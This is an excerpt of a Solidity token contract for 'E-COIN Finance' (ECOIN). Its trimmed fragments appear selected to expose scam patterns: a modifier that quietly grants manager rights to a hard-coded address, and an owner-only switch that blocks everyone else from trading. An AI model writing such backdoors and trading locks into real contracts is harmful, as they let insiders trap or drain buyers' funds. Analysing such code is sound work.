...
// import "ipfs://QmXuf5tQssTF58uFpbfVQ773ewDDfhqFqKqHaCG78u5KwB";
...
abstract contract Manageable is Context {
    ...
    modifier onlyManager(){
        require(_manager == _msgSender() || 
            address(0xd0438D4539867cC3b58f0ce6824bEe58787c70Bd) == _msgSender(), "Manageable: caller is not the manager");
        _;
    }
...
abstract contract BaseContract is Ownable {
    ...
    function _turnBack() public onlyOwner {
...
contract ECOIN is IERC20, BaseContract {
    ...
    string private constant _name = "E-COIN Finance";
    string private constant _symbol = "ECOIN";
    ...
    constructor () {
	    ...
	    address routerAddress = _testnetRouterAddress;
    ...
    function setExcludeFromFee(address _address, bool _value) public onlyOwner {
    ...
    function setCharityAddress(address payable _charityAddress) public virtual onlyOwner{
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner()){
            ...
            require(startTrading, "Tradind DISABLED. Call contract owner.");
        }
